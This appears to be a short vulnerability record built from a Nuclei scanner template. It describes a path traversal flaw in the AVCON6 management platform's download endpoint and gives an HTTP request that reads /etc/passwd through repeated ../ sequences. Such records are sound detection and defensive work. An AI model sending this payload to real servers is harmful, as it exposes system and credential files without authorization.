# Vulnerability: AVCON6 - Arbitrary File Download
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`avcon6-lfi.yaml`)

## Description
File Download vulnerability in the download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/download.action?filename=../../../../../../etc/passwd
```

